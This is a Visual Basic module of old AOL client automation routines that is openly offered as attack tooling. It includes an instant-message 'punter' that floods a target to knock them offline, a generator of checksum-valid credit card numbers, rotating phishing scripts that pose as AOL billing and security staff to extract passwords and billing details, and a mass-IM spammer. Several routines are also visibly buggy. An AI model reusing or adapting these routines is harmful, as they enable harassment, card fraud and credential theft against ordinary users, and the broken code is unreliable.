Sub XAOL4_Mail(person, Subject, Message)
Const LBUTTONDBLCLK = &H203
AOL% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(AOL%, "AOL Toolbar")
tool2% = FindChildByClass(tool%, "_AOL_Toolbar")
ico3n% = FindChildByClass(tool2%, "_AOL_Icon")
Icon2% = GetWindow(ico3n%, 2)
X = SendMessageByNum(Icon2%, WM_LBUTTONDOWN, 0&, 0&)
X = SendMessageByNum(Icon2%, WM_LBUTTONUP, 0&, 0&)
Pause (4)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDIClient")
    Mail% = FindChildByTitle(MDI%, "Write Mail")
    AOLEdit% = FindChildByClass(Mail%, "_AOL_Edit")
    aolrich% = FindChildByClass(Mail%, "RICHCNTL")
    subjt% = FindChildByTitle(Mail%, "Subject:")
    Subjec% = GetWindow(subjt%, 2)
        Call AOLSetText(AOLEdit%, person)
        Call AOLSetText(Subjec%, Subject)
        Call AOLSetText(aolrich%, Message)
e = FindChildByClass(Mail%, "_AOL_Icon")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
AOLIcon (e)
End Sub
Public Sub XAOL4_MassIM(Lst As ListBox, Txt As TextBox)
Lst.Enabled = False
i = Lst.ListCount - 1
Lst.ListIndex = 0
For X = 0 To i
Lst.ListIndex = X
Call XAOL4_InstantMessage(Lst.text, Txt.text)
Pause (1)
Next X
Lst.Enabled = True
End Sub
Sub XAOL4_OpenChat()
XAOL4_Keyword ("PC")
End Sub
Sub XAOL4_OpenPR(PRrm As TextBox)
Call XAOL4_Keyword("aol://2719:2-2-" & PRrm)
End Sub
Sub XAOL4_Punter(SN As TextBox, Bombz As TextBox)
Call XAOL4_IMOff
waitforok
Do
DoEvents:
Call XAOL4_InstantMessage(SN, "<h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h3><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3>")
DAWIN% = FindWindow("#32770", "America Online")
If DAWIN% Then Exit Sub: MsgBox "Sorry person isn't online!", 48, "DAMMIT!"
Bombz = Str(Val(Bombz - 1))
Loop Until Bombz <= 0
Call XAOL4_IMOn
waitforok
End Sub
Sub XAOL4_Read1Mail()
'This will read the very first mail in the User's box
MailBox% = FindChildByTitle(AOLMDI(), AOL4_GetUser + "'s Online Mailbox")
e = FindChildByClass(MailBox%, "_AOL_Icon")
AOLIcon (e)
End Sub
Function XAOL4_RoomCount()
thechild% = XAOL4_FindRoom()
lister% = FindChildByClass(thechild%, "_AOL_Listbox")
getcount = SendMessage(lister%, LB_GETCOUNT, 0, 0)
AOL4_RoomCount = getcount
End Function
Sub XAOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Sub XAOL4_SignOff()
Call RunMenuByString("Sign Off")
End Sub

Sub XAOL4_UnHide()
A = ShowWindow(AOLWindow(), SW_SHOW)
End Sub
Sub XAOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(aolmod%, SW_RESTORE)
Call XAOL4_SetFocus
End Sub
Function XAOL4_UpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_HIDE)
X = ShowWindow(die%, SW_MINIMIZE)
Call XAOL4_SetFocus
End Function
Sub ClipBoard_CopyBMP(ToWhere)
ToWhere = Clipboard.GetData(CF_BITMAP)
End Sub

Sub ClipBoard_CopyDIB(ToWhere)
ToWhere = Clipboard.GetData(CF_DIB)
End Sub

'
Sub ClipBoard_CopyLink(ToWhere)
ToWhere = Clipboard.GetData(CF_LINK)
End Sub

Sub ClipBoard_CopyPalette(ToWhere)
ToWhere = Clipboard.GetData(CF_PALETTE)
End Sub

Sub ClipBoard_CopyText(ToWhere)
ToWhere = Clipboard.GetText(CF_TEXT)
End Sub

Sub ClipBoard_CopyTo(what$)
Clipboard.SetText what$
End Sub

Sub ClipBoard_SetBMP(FromWhere)
Clipboard.SetData (FromWhere)
End Sub
Function CreditCard2(prefix)
loogie:
A = 0
Randomize Timer
heh = 99 * Rnd
Do
If Val(heh) = 10 Then heh = heh - (Int(10 * Rnd))
If Val(heh) < 10 Then GoTo hhhf
If heh > 10 Then
heh = heh - Int(10 * Rnd)
End If
Loop Until heh < 10
hhhf:
G1 = 4
G2 = Int(Val(heh) * Rnd)
G3 = Int(Val(heh) * Rnd)
G4 = Int(Val(heh) * Rnd)
G5 = Int(Val(heh) * Rnd)
G6 = Int(Val(heh) * Rnd)
G7 = Int(Val(heh) * Rnd)
G8 = Int(Val(heh) * Rnd)
G9 = Int(Val(heh) * Rnd)
G10 = Int(Val(heh) * Rnd)
g11 = Int(Val(heh) * Rnd)
g12 = Int(Val(heh) * Rnd)
g13 = Int(Val(heh) * Rnd)
g14 = Int(Val(heh) * Rnd)
g15 = Int(Val(heh) * Rnd)
g16 = Int(Val(heh) * Rnd)
gee = 0
hehd:
Do
NoFreeze% = DoEvents()
T1$ = G1
T2$ = G2
T3$ = G3
T4$ = G4
T5$ = G5
T6$ = G6
T7$ = G7
T8$ = G8
T9$ = G9
T10$ = G10
T11$ = g11
T12$ = g12
T13$ = g13
T14$ = g14
T15$ = g15
T16$ = g16
Evens = Val(T2$) + Val(T4$) + Val(T6$) + Val(T8$) + Val(T10$) + Val(T12$) + Val(T14$) + Val(T16$)
c1 = T1$
c3 = T3$
C5 = T5$
C7 = T7$
C9 = T9$
C11 = T11$
C13 = T13$
C15 = T15$
c1 = Val(c1) + Val(c1)
c3 = Val(c3) + Val(c3)
C5 = Val(C5) + Val(C5)
C7 = Val(C7) + Val(C7)
C9 = Val(C9) + Val(C9)
C11 = Val(C11) + Val(C11)
C13 = Val(C13) + Val(C13)
C15 = Val(C15) + Val(C15)
If c1 > 9 Then c1 = c1 - 9
If c3 > 9 Then c3 = c3 - 9
If C5 > 9 Then C5 = C5 - 9
If C7 > 9 Then C7 = C7 - 9
If C9 > 9 Then C9 = C9 - 9
If C11 > 9 Then C11 = C11 - 9
If C13 > 9 Then C13 = C13 - 9
If C15 > 9 Then C15 = C15 - 9
A = 1 + A
If A = 10 Then GoTo loogie
Odds = Val(c1) + Val(c3) + Val(C5) + Val(C7) + Val(C9) + Val(C11) + Val(C13) + Val(C15)
If Int((Odds + Evens) / 60) = (Odds + Evens) / 60 Then GoTo bob
hah = 60
If gee = 0 Then g16 = -1
g16 = g16 + 1
If g16 > 10 Then
g13 = Int(10 * Rnd)
g14 = Int(Val(heh) * Rnd)
g15 = Int(Val(heh) * Rnd)
g16 = Int(Val(heh) * Rnd)
gee = 0
GoTo hehd
End If
gee = 1
Loop
bob:
bahq$ = G1 & G2 & G3 & G4 & "-" & G5 & G6 & G7 & G8 & "-" & G9 & G10 & g11 & g12 & "-" & g13 & g14 & g15 & g16
gencc = bahq$


End Function
Function FixAPIString(ByVal sText As String) As String
On Error Resume Next
FixAPIString = Trim(Left$(sText, InStr(sText, Chr$(0)) - 1))
End Function



Sub PhishGenerator(Txt As TextBox, txt2 As TextBox)
Randomize
A = Int((Val("26") * Rnd) + 1)
If A = "1" Then
A = ""
ElseIf A = "2" Then: A = "B"
ElseIf A = "3" Then: A = "C"
ElseIf A = "4" Then: A = "D"
ElseIf A = "5" Then: A = ""
ElseIf A = "6" Then: A = "F"
ElseIf A = "7" Then: A = "G"
ElseIf A = "8" Then: A = "H"
ElseIf A = "9" Then: A = ""
ElseIf A = "10" Then: A = "J"
ElseIf A = "11" Then: A = "K"
ElseIf A = "12" Then: A = "L"
ElseIf A = "13" Then: A = "M"
ElseIf A = "14" Then: A = "N"
ElseIf A = "15" Then: A = ""
ElseIf A = "16" Then: A = "P"
ElseIf A = "17" Then: A = "Q"
ElseIf A = "18" Then: A = "R"
ElseIf A = "19" Then: A = "S"
ElseIf A = "20" Then: A = "T"
ElseIf A = "21" Then: A = ""
ElseIf A = "22" Then: A = "V"
ElseIf A = "23" Then: A = "W"
ElseIf A = "24" Then: A = "Y"
ElseIf A = "25" Then: A = "X"
ElseIf A = "26" Then: A = "Z"
End If
Txt = A

Randomize
b = Int((Val("37") * Rnd) + 1)
If b = "1" Then
b = "A"
ElseIf b = "2" Then: b = "B"
ElseIf b = "3" Then: b = "C"
ElseIf b = "4" Then: b = "D"
ElseIf b = "5" Then: b = "E"
ElseIf b = "6" Then: b = "F"
ElseIf b = "7" Then: b = "G"
ElseIf b = "8" Then: b = "H"
ElseIf b = "9" Then: b = "I"
ElseIf b = "10" Then: b = "J"
ElseIf b = "11" Then: b = "K"
ElseIf b = "12" Then: b = "L"
ElseIf b = "13" Then: b = "M"
ElseIf b = "14" Then: b = "N"
ElseIf b = "15" Then: b = "O"
ElseIf b = "16" Then: b = "P"
ElseIf b = "17" Then: b = "Q"
ElseIf b = "18" Then: b = "R"
ElseIf b = "19" Then: b = "S"
ElseIf b = "20" Then: b = "T"
ElseIf b = "21" Then: b = "U"
ElseIf b = "22" Then: b = "V"
ElseIf b = "23" Then: b = "W"
ElseIf b = "24" Then: b = "Y"
ElseIf b = "25" Then: b = "X"
ElseIf b = "26" Then: b = "Z"
ElseIf b = "27" Then: b = "0"
ElseIf b = "28" Then: b = "1"
ElseIf b = "29" Then: b = "2"
ElseIf b = "30" Then: b = "3"
ElseIf b = "31" Then: b = "4"
ElseIf b = "32" Then: b = "5"
ElseIf b = "33" Then: b = "6"
ElseIf b = "34" Then: b = "7"
ElseIf b = "35" Then: b = "8"
ElseIf b = "36" Then: b = "9"
ElseIf b = "37" Then: b = " "
End If
Txt = A + b

Randomize
c = Int((Val("6") * Rnd) + 1)
If c = "1" Then
c = "A"
ElseIf c = "2" Then: c = "E"
ElseIf c = "3" Then: c = "I"
ElseIf c = "4" Then: c = "O"
ElseIf c = "5" Then: c = "U"
ElseIf c = "6" Then: c = " "
End If
Txt = A + b + c

Randomize
D = Int((Val("37") * Rnd) + 1)
If D = "1" Then
D = " "
ElseIf D = "2" Then: D = "B"
ElseIf D = "3" Then: D = "C"
ElseIf D = "4" Then: D = "D"
ElseIf D = "5" Then: D = " "
ElseIf D = "6" Then: D = "F"
ElseIf D = "7" Then: D = "G"
ElseIf D = "8" Then: D = "H"
ElseIf D = "9" Then: D = " "
ElseIf D = "10" Then: D = "J"
ElseIf D = "11" Then: D = "K"
ElseIf D = "12" Then: D = "L"
ElseIf D = "13" Then: D = "M"
ElseIf D = "14" Then: D = "N"
ElseIf D = "15" Then: D = " "
ElseIf D = "16" Then: D = "P"
ElseIf D = "17" Then: D = "Q"
ElseIf D = "18" Then: D = "R"
ElseIf D = "19" Then: D = "S"
ElseIf D = "20" Then: D = "T"
ElseIf D = "21" Then: D = " "
ElseIf D = "22" Then: D = "V"
ElseIf D = "23" Then: D = "W"
ElseIf D = "24" Then: D = "Y"
ElseIf D = "25" Then: D = "X"
ElseIf D = "26" Then: D = "Z"
ElseIf D = "27" Then: D = "0"
ElseIf D = "28" Then: D = "1"
ElseIf D = "29" Then: D = "2"
ElseIf D = "30" Then: D = "3"
ElseIf D = "31" Then: D = "4"
ElseIf D = "32" Then: D = "5"
ElseIf D = "33" Then: D = "6"
ElseIf D = "34" Then: D = "7"
ElseIf D = "35" Then: D = "8"
ElseIf D = "36" Then: D = "9"
ElseIf D = "37" Then: D = " "

End If
Txt = A + b + c + D

Randomize
e = Int((Val("6") * Rnd) + 1)
If e = "1" Then
e = "A"
ElseIf e = "2" Then: e = "E"
ElseIf e = "3" Then: e = "I"
ElseIf e = "4" Then: e = "O"
ElseIf e = "5" Then: e = "U"
ElseIf e = "6" Then: e = " "
End If
Txt = A + b + c + D + e

Randomize
f = Int((Val("37") * Rnd) + 1)
If f = "1" Then
f = ""
ElseIf f = "2" Then: f = "B"
ElseIf f = "3" Then: f = "C"
ElseIf f = "4" Then: f = "D"
ElseIf f = "5" Then: f = ""
ElseIf f = "6" Then: f = "F"
ElseIf f = "7" Then: f = "G"
ElseIf f = "8" Then: f = "H"
ElseIf f = "9" Then: f = ""
ElseIf f = "10" Then: f = "J"
ElseIf f = "11" Then: f = "K"
ElseIf f = "12" Then: f = "L"
ElseIf f = "13" Then: f = "M"
ElseIf f = "14" Then: f = "N"
ElseIf f = "15" Then: f = ""
ElseIf f = "16" Then: f = "P"
ElseIf f = "17" Then: f = "Q"
ElseIf f = "18" Then: f = "R"
ElseIf f = "19" Then: f = "S"
ElseIf f = "20" Then: f = "T"
ElseIf f = "21" Then: f = ""
ElseIf f = "22" Then: f = "V"
ElseIf f = "23" Then: f = "W"
ElseIf f = "24" Then: f = "Y"
ElseIf f = "25" Then: f = "X"
ElseIf f = "26" Then: f = "Z"
ElseIf f = "27" Then: f = "0"
ElseIf f = "28" Then: f = "1"
ElseIf f = "29" Then: f = "2"
ElseIf f = "30" Then: f = "3"
ElseIf f = "31" Then: f = "4"
ElseIf f = "32" Then: f = "5"
ElseIf f = "33" Then: f = "6"
ElseIf f = "34" Then: f = "7"
ElseIf f = "35" Then: f = "8"
ElseIf f = "36" Then: f = "9"
ElseIf f = "37" Then: f = " "
End If
Txt = A + b + c + D + e + f

Randomize
G = Int((Val("6") * Rnd) + 1)
If G = "1" Then
G = "A"
ElseIf G = "2" Then: G = "E"
ElseIf G = "3" Then: G = "I"
ElseIf G = "4" Then: G = "O"
ElseIf G = "5" Then: G = "U"
ElseIf G = "6" Then: G = " "
End If
Txt = A + b + c + D + e + f + G

Randomize
h = Int((Val("37") * Rnd) + 1)
If h = "1" Then
h = ""
ElseIf h = "2" Then: h = "B"
ElseIf h = "3" Then: h = "C"
ElseIf h = "4" Then: h = "D"
ElseIf h = "5" Then: h = ""
ElseIf h = "6" Then: h = "F"
ElseIf h = "7" Then: h = "G"
ElseIf h = "8" Then: h = "H"
ElseIf h = "9" Then: h = ""
ElseIf h = "10" Then: h = "J"
ElseIf h = "11" Then: h = "K"
ElseIf h = "12" Then: h = "L"
ElseIf h = "13" Then: h = "M"
ElseIf h = "14" Then: h = "N"
ElseIf h = "15" Then: h = ""
ElseIf h = "16" Then: h = "P"
ElseIf h = "17" Then: h = "Q"
ElseIf h = "18" Then: h = "R"
ElseIf h = "19" Then: h = "S"
ElseIf h = "20" Then: h = "T"
ElseIf h = "21" Then: h = ""
ElseIf h = "22" Then: h = "V"
ElseIf h = "23" Then: h = "W"
ElseIf h = "24" Then: h = "Y"
ElseIf h = "25" Then: h = "X"
ElseIf h = "26" Then: h = "Z"
ElseIf h = "27" Then: h = "0"
ElseIf h = "28" Then: h = "1"
ElseIf h = "29" Then: h = "2"
ElseIf h = "30" Then: h = "3"
ElseIf h = "31" Then: h = "4"
ElseIf h = "32" Then: h = "5"
ElseIf h = "33" Then: h = "6"
ElseIf h = "34" Then: h = "7"
ElseIf h = "35" Then: h = "8"
ElseIf h = "36" Then: h = "9"
ElseIf h = "37" Then: h = " "
End If
Txt = A + b + c + D + e + f + G + h

Randomize
i = Int((Val("6") * Rnd) + 1)
If i = "1" Then
i = "E"
ElseIf i = "2" Then: i = "A"
ElseIf i = "3" Then: i = "I"
ElseIf i = "4" Then: i = "O"
ElseIf i = "5" Then: i = "U"
ElseIf i = "6" Then: i = " "
End If
Txt = A + b + c + D + e + f + G + h + i

Randomize
j = Int((Val("37") * Rnd) + 1)
If j = "1" Then
j = "A"
ElseIf j = "2" Then: j = "B"
ElseIf j = "3" Then: j = "C"
ElseIf j = "4" Then: j = "D"
ElseIf j = "5" Then: j = "E"
ElseIf j = "6" Then: j = "F"
ElseIf j = "7" Then: j = "G"
ElseIf j = "8" Then: j = "H"
ElseIf j = "9" Then: j = "I"
ElseIf j = "10" Then: j = "J"
ElseIf j = "11" Then: j = "K"
ElseIf j = "12" Then: j = "L"
ElseIf j = "13" Then: j = "M"
ElseIf j = "14" Then: j = "N"
ElseIf j = "15" Then: j = "O"
ElseIf j = "16" Then: j = "P"
ElseIf j = "17" Then: j = "Q"
ElseIf j = "18" Then: j = "R"
ElseIf j = "19" Then: j = "S"
ElseIf j = "20" Then: j = "T"
ElseIf j = "21" Then: j = "U"
ElseIf j = "22" Then: j = "V"
ElseIf j = "23" Then: j = "W"
ElseIf j = "24" Then: j = "Y"
ElseIf j = "25" Then: j = "X"
ElseIf j = "26" Then: j = "Z"
ElseIf j = "27" Then: j = "0"
ElseIf j = "28" Then: j = "1"
ElseIf j = "29" Then: j = "2"
ElseIf j = "30" Then: j = "3"
ElseIf j = "31" Then: j = "4"
ElseIf j = "32" Then: j = "5"
ElseIf j = "33" Then: j = "6"
ElseIf j = "34" Then: j = "7"
ElseIf j = "35" Then: j = "8"
ElseIf j = "36" Then: j = "9"
ElseIf j = "37" Then: j = " "
End If
Txt = A + b + c + D + e + f + G + h + j


Randomize
K = Int((Val("37") * Rnd) + 1)
If K = "1" Then
K = "A"
ElseIf K = "2" Then: K = "B"
ElseIf K = "3" Then: K = "C"
ElseIf K = "4" Then: K = "D"
ElseIf K = "5" Then: K = "E"
ElseIf K = "6" Then: K = "F"
ElseIf K = "7" Then: K = "G"
ElseIf K = "8" Then: K = "H"
ElseIf K = "9" Then: K = "I"
ElseIf K = "10" Then: K = "J"
ElseIf K = "11" Then: K = "K"
ElseIf K = "12" Then: K = "L"
ElseIf K = "13" Then: K = "M"
ElseIf K = "14" Then: K = "N"
ElseIf K = "15" Then: K = "O"
ElseIf K = "16" Then: K = "P"
ElseIf K = "17" Then: K = "Q"
ElseIf K = "18" Then: K = "R"
ElseIf K = "19" Then: K = "S"
ElseIf K = "20" Then: K = "T"
ElseIf K = "21" Then: K = "U"
ElseIf K = "22" Then: K = "V"
ElseIf K = "23" Then: K = "W"
ElseIf K = "24" Then: K = "Y"
ElseIf K = "25" Then: K = "X"
ElseIf K = "26" Then: K = "Z"
ElseIf K = "27" Then: K = "0"
ElseIf K = "28" Then: K = "1"
ElseIf K = "29" Then: K = "2"
ElseIf K = "30" Then: K = "3"
ElseIf K = "31" Then: K = "4"
ElseIf K = "32" Then: K = "5"
ElseIf K = "33" Then: K = "6"
ElseIf K = "34" Then: K = "7"
ElseIf K = "35" Then: K = "8"
ElseIf K = "36" Then: K = "9"
ElseIf K = "37" Then: K = ""
End If
txt2 = K
Randomize
l = Int((Val("37") * Rnd) + 1)
If j = "1" Then
l = "A"
ElseIf l = "2" Then: l = "B"
ElseIf l = "3" Then: l = "C"
ElseIf l = "4" Then: l = "D"
ElseIf l = "5" Then: l = "E"
ElseIf l = "6" Then: l = "F"
ElseIf l = "7" Then: l = "G"
ElseIf l = "8" Then: l = "H"
ElseIf l = "9" Then: l = "I"
ElseIf l = "10" Then: l = "j"
ElseIf l = "11" Then: l = "k"
ElseIf l = "12" Then: l = "L"
ElseIf l = "13" Then: l = "M"
ElseIf l = "14" Then: l = "N"
ElseIf l = "15" Then: l = "O"
ElseIf l = "16" Then: l = "P"
ElseIf l = "17" Then: l = "Q"
ElseIf l = "18" Then: l = "R"
ElseIf l = "19" Then: l = "S"
ElseIf l = "20" Then: l = "T"
ElseIf l = "21" Then: l = "U"
ElseIf l = "22" Then: l = "V"
ElseIf l = "23" Then: l = "W"
ElseIf l = "24" Then: l = "Y"
ElseIf l = "25" Then: l = "X"
ElseIf l = "26" Then: l = "Z"
ElseIf l = "27" Then: l = "0"
ElseIf l = "28" Then: l = "1"
ElseIf l = "29" Then: l = "2"
ElseIf l = "30" Then: l = "3"
ElseIf l = "31" Then: l = "4"
ElseIf l = "32" Then: l = "5"
ElseIf l = "33" Then: l = "6"
ElseIf l = "34" Then: l = "7"
ElseIf l = "35" Then: l = "8"
ElseIf l = "36" Then: l = "9"
ElseIf l = "37" Then: l = ""
End If
txt2 = K + l
Randomize
M = Int((Val("37") * Rnd) + 1)
If j = "1" Then
M = "A"
ElseIf M = "2" Then: M = "B"
ElseIf M = "3" Then: M = "C"
ElseIf M = "4" Then: M = "D"
ElseIf M = "5" Then: M = "E"
ElseIf M = "6" Then: M = "F"
ElseIf M = "7" Then: M = "G"
ElseIf M = "8" Then: M = "H"
ElseIf M = "9" Then: M = "I"
ElseIf M = "10" Then: M = "k"
ElseIf M = "11" Then: M = "l"
ElseIf M = "12" Then: M = "m"
ElseIf M = "13" Then: M = "M"
ElseIf M = "14" Then: M = "N"
ElseIf M = "15" Then: M = "O"
ElseIf M = "16" Then: M = "P"
ElseIf M = "17" Then: M = "Q"
ElseIf M = "18" Then: M = "R"
ElseIf M = "19" Then: M = "S"
ElseIf M = "20" Then: M = "T"
ElseIf M = "21" Then: M = "U"
ElseIf M = "22" Then: M = "V"
ElseIf M = "23" Then: M = "W"
ElseIf M = "24" Then: M = "Y"
ElseIf M = "25" Then: M = "X"
ElseIf M = "26" Then: M = "Z"
ElseIf M = "27" Then: M = "0"
ElseIf M = "28" Then: M = "1"
ElseIf M = "29" Then: M = "2"
ElseIf M = "30" Then: M = "3"
ElseIf M = "31" Then: M = "4"
ElseIf M = "32" Then: M = "5"
ElseIf M = "33" Then: M = "6"
ElseIf M = "34" Then: M = "7"
ElseIf M = "35" Then: M = "8"
ElseIf M = "36" Then: M = "9"
ElseIf M = "37" Then: M = ""
End If
txt2 = K + l + M

Randomize
n = Int((Val("37") * Rnd) + 1)
If j = "1" Then
n = "A"
ElseIf n = "2" Then: n = "B"
ElseIf n = "3" Then: n = "C"
ElseIf n = "4" Then: n = "D"
ElseIf n = "5" Then: n = "E"
ElseIf n = "6" Then: n = "F"
ElseIf n = "7" Then: n = "G"
ElseIf n = "8" Then: n = "H"
ElseIf n = "9" Then: n = "I"
ElseIf n = "10" Then: n = "k"
ElseIf n = "11" Then: n = "l"
ElseIf n = "12" Then: n = "m"
ElseIf n = "13" Then: n = "n"
ElseIf n = "14" Then: n = "N"
ElseIf n = "15" Then: n = "O"
ElseIf n = "16" Then: n = "P"
ElseIf n = "17" Then: n = "Q"
ElseIf n = "18" Then: n = "R"
ElseIf n = "19" Then: n = "S"
ElseIf n = "20" Then: n = "T"
ElseIf n = "21" Then: n = "U"
ElseIf n = "22" Then: n = "V"
ElseIf n = "23" Then: n = "W"
ElseIf n = "24" Then: n = "Y"
ElseIf n = "25" Then: n = "X"
ElseIf n = "26" Then: n = "Z"
ElseIf n = "27" Then: n = "0"
ElseIf n = "28" Then: n = "1"
ElseIf n = "29" Then: n = "2"
ElseIf n = "30" Then: n = "3"
ElseIf n = "31" Then: n = "4"
ElseIf n = "32" Then: n = "5"
ElseIf n = "33" Then: n = "6"
ElseIf n = "34" Then: n = "7"
ElseIf n = "35" Then: n = "8"
ElseIf n = "36" Then: n = "9"
ElseIf n = "37" Then: n = ""
End If
txt2 = K + l + M + n

Randomize
O = Int((Val("37") * Rnd) + 1)
If j = "1" Then
O = "A"
ElseIf O = "2" Then: O = "B"
ElseIf O = "3" Then: O = "C"
ElseIf O = "4" Then: O = "D"
ElseIf O = "5" Then: O = "E"
ElseIf O = "6" Then: O = "F"
ElseIf O = "7" Then: O = "G"
ElseIf O = "8" Then: O = "H"
ElseIf O = "9" Then: O = "I"
ElseIf O = "10" Then: O = "k"
ElseIf O = "11" Then: O = "l"
ElseIf O = "12" Then: O = "m"
ElseIf O = "13" Then: O = "M"
ElseIf O = "14" Then: O = "N"
ElseIf O = "15" Then: O = "O"
ElseIf O = "16" Then: O = "P"
ElseIf O = "17" Then: O = "Q"
ElseIf O = "18" Then: O = "R"
ElseIf O = "19" Then: O = "S"
ElseIf O = "20" Then: O = "T"
ElseIf O = "21" Then: O = "U"
ElseIf O = "22" Then: O = "V"
ElseIf O = "23" Then: O = "W"
ElseIf O = "24" Then: O = "Y"
ElseIf O = "25" Then: O = "X"
ElseIf O = "26" Then: O = "Z"
ElseIf O = "27" Then: O = "0"
ElseIf O = "28" Then: O = "1"
ElseIf O = "29" Then: O = "2"
ElseIf O = "30" Then: O = "3"
ElseIf O = "31" Then: O = "4"
ElseIf O = "32" Then: O = "5"
ElseIf O = "33" Then: O = "6"
ElseIf O = "34" Then: O = "7"
ElseIf O = "35" Then: O = "8"
ElseIf O = "36" Then: O = "9"
ElseIf O = "37" Then: O = ""
End If
txt2 = K + l + M + n + O

End Sub



Function XAOL4_AOLVersion()
hMenu% = GetMenu(AOLWindow())
SubMenu% = GetSubMenu(hMenu%, 0)
SubItem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")
FindString% = GetMenuString(SubMenu%, SubItem%, MenuString$, 100, 1)
If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
AOLVersion = 3
Else
AOLVersion = 4
End If
End Function
Function PhishBait()
Dim dsa$
Dim das$
dsa$ = ""
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then dsa$ = "Hi, "
If asd = 2 Then dsa$ = "Hello, "
If asd = 3 Then dsa$ = "Good Day, "
If asd = 4 Then dsa$ = "Good Afternoon, "
If asd = 5 Then dsa$ = "Good Evening, "
If asd = 6 Then dsa$ = "Good Morning, "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = dsa$ & "I am with the America Online User Resource Department.  "
If asd = 2 Then das$ = dsa$ & "I am Bill Smith, a billing representative for America Online.  "
If asd = 3 Then das$ = dsa$ & "I am Sharon Stevenson, a member of the America Online security task force.  "
If asd = 4 Then das$ = dsa$ & "I am with the America Online Online Security Force.  "
If asd = 5 Then das$ = dsa$ & "I am with the America Online billing department.  "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department.  "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation.  "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate cancellation of this account.  "
If asd = 3 Then das$ = das$ & "We have reason to believe that an unauthorized user is loggin on to your account.  We suggest you change your password and send it to me.  Failure to do so will result in immediate cancellation of your account.  "
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with AOLNet, we need you to verify your log-in password to me so that you can continue your current session with America Online.  "
If asd = 5 Then das$ = das$ & "While checking out dial-up records I have seen people logging on from Canada using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cancellation of this account.  "
If asd = 6 Then das$ = das$ & "You may have heard about the recent attack on our servers, all information regarding your account was lost. Please IM me back with your billing information.  "
 Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Sorry for the inconvenience.  Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online.   :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and thank you for making America Online number 1!    :-) "
 
PhishBait = das$

 
End Function
Sub AOLHostNameChange(SN As String)
X = AOLVersion()
If X = "C:\america online 4.0" Or "C:\america online 4.0a" Then
Open "C:\america online 4.0\tool\aolchat.aol" Or "C:\america online 4.0a\tool\aolchat.aol" For Binary As #1
Seek #1, 6887
Put #1, , SN

Close #1
ElseIf X = "C:\aol30" Then
Open "C:\aol30\tool\chat.aol" For Binary As #1
Seek #1, 6887
Put #1, , SN

Close #1
End If
End Sub
Function FindIMTextwindow()
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
FindIMTextwindow = FindChildByClass(im%, "RICHCNTL")
End Function
Function FindIMCaption()
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
FindIMCaption = FindChildByClass(im%, "_AOL_Static")
End Function
Sub AOL40_IMAFK(List1 As ListBox, text)
'Put This In Timmer than Set Its Interval To 1
TimeOut 2
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin = FindChildByTitle(MDI%, ">Instant Message From:")
rch2% = FindChildByClass(IMWin, "RICHCNTL")
nme = aol40_SNFromIM
X = GetText(rch2%)
If IMWin <> 0 Then
closewin IMWin
Call IMKeyword("" + nme, text)
List1.AddItem nme
End If
End Sub
Sub AOL40_IMIgnorer(List As ListBox)
'This Closes The IM Box From The Person Thats In The List
'Call IMIgnorer(List1)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin = FindChildByTitle(MDI%, ">Instant Message From:")
rch2% = FindChildByClass(IMWin, "RICHCNTL")
nme = aol40_SNFromIM
If rch2% <> 0 Then
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
